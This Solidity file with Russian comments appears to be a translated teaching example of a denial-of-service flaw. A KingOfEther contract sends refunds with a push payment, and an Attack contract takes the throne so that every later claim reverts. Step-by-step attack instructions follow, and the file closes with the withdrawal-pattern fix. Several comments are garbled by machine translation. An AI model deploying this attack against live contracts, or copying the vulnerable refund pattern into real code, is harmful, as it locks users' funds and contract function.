/*
Отказ в обслуживании
Уязвимость
Есть много способов атаковать смарт-контракт, чтобы сделать его непригодным для использования.

Один эксплойт, который мы представляем здесь, 
— это отказ в обслуживании, приводящий к сбою функции отправки эфира.
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Цель KingOfEther — стать королем, отправив больше эфира, чем
предыдущий король. Предыдущему королю будет возвращено количество эфира
он послал.
*/

/*
1. Разверните KingOfEther
2. Алиса становится королем, отправив 1 Эфир в функциюclaimThrone().
2. Боб становится королем, отправив 2 Эфира в функцию requireThrone().
    Алиса получает возмещение в размере 1 эфира.
3. Развернуть Атаку с адресом KingOfEther.
4. Вызвать атаку 3 Эфира.
5. Текущим королем является Атакующий контракт, и никто не может стать новым королем.

Что случилось?
Атака стала королем. Все новые попытки претендовать на трон будут отклонены
поскольку контракт Атаки не имеет резервной функции, отказывая в принятии
Эфир отправлен от KingOfEther до того, как будет установлен новый король.
*/

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // Вы также можете выполнить DOS, потребляя весь газ, используя assert.
     // Эта атака сработает, даже если вызывающий контракт не проверяет
     // был ли вызов успешным или нет.
     //
     // функция () внешняя кредиторская задолженность {
     // утверждение(ложь);
     // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
//Один из способов предотвратить это — разрешить пользователям снимать свой эфир вместо его отправки.